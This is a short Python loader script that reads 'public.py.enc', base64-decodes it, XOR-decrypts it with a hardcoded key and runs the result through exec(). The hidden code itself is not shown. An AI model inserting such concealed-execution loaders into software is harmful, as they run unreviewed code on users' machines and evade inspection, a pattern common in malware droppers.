import base64

KEY = "TLQ3aSjiVaomaEgp"

def xor_decrypt(data, key):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, key * (len(data) // len(key) + 1)))

with open("public.py.enc", "rb") as enc_file:
    encrypted_script_base64 = enc_file.read().decode()

encrypted_script = base64.b64decode(encrypted_script_base64).decode()
decrypted_script = xor_decrypt(encrypted_script, KEY)

exec(decrypted_script)
